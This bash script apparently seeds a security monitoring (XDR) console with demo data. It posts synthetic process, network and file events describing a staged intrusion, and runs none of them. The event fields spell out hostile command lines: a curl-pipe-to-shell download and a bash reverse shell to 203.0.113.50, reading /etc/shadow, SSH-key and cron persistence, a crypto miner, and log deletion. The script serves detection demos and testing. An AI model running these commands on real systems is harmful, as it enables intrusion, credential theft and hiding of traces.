#!/usr/bin/env bash
# Replays a synthetic intrusion (web shell -> credential access -> persistence
# -> miner) through the XDR ingest API so the console has something to show.
# No real commands are executed on any host; only event records are posted.
#
#   POSTERN_URL=http://127.0.0.1:8460 POSTERN_TOKEN=pca_... scripts/simulate-attack.sh
set -euo pipefail
URL="${POSTERN_URL:-http://127.0.0.1:8460}"
TOKEN="${POSTERN_TOKEN:?set POSTERN_TOKEN to an admin token or API key}"
SOURCE="${1:-demo-web-01}"

curl -fsS "$URL/api/v1/ingest" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d @- <<JSON
{"source": "$SOURCE", "events": [
 {"kind":"process_start","fields":{"process.pid":4101,"process.ppid":812,"process.parent_name":"php-fpm","process.name":"sh","process.exe":"/usr/bin/dash","process.user":"www-data","process.cmdline":"sh -c id; uname -a"}},
 {"kind":"process_start","fields":{"process.pid":4107,"process.ppid":4101,"process.parent_name":"sh","process.name":"curl","process.exe":"/usr/bin/curl","process.user":"www-data","process.cmdline":"sh -c curl -fsSL http://203.0.113.50/s.sh | sh"}},
 {"kind":"process_start","fields":{"process.pid":4120,"process.ppid":4107,"process.parent_name":"sh","process.name":"bash","process.exe":"/usr/bin/bash","process.user":"www-data","process.cmdline":"bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"}},
 {"kind":"net_conn","fields":{"net.direction":"outbound","net.remote_ip":"203.0.113.50","net.remote_port":4444,"net.local_port":51522,"net.protocol":"tcp","process.name":"bash","process.pid":4120}},
 {"kind":"process_start","fields":{"process.pid":4188,"process.ppid":4120,"process.parent_name":"bash","process.name":"cat","process.exe":"/usr/bin/cat","process.user":"root","process.cmdline":"cat /etc/shadow"}},
 {"kind":"file_change","fields":{"file.path":"/root/.ssh/authorized_keys","file.action":"modified","file.size":571,"file.mode":"600"}},
 {"kind":"file_change","fields":{"file.path":"/etc/cron.d/sysupdate","file.action":"created","file.size":64,"file.mode":"644"}},
 {"kind":"process_start","fields":{"process.pid":4240,"process.ppid":1,"process.parent_name":"systemd","process.name":"kdevtmpfsi","process.exe":"/tmp/kdevtmpfsi","process.user":"root","process.cmdline":"/tmp/kdevtmpfsi -o stratum+tcp://pool.example.net:3333 --donate-level 1"}},
 {"kind":"process_start","fields":{"process.pid":4266,"process.ppid":4120,"process.parent_name":"bash","process.name":"rm","process.exe":"/usr/bin/rm","process.user":"root","process.cmdline":"rm -f /var/log/auth.log /root/.bash_history"}}
]}
JSON
echo
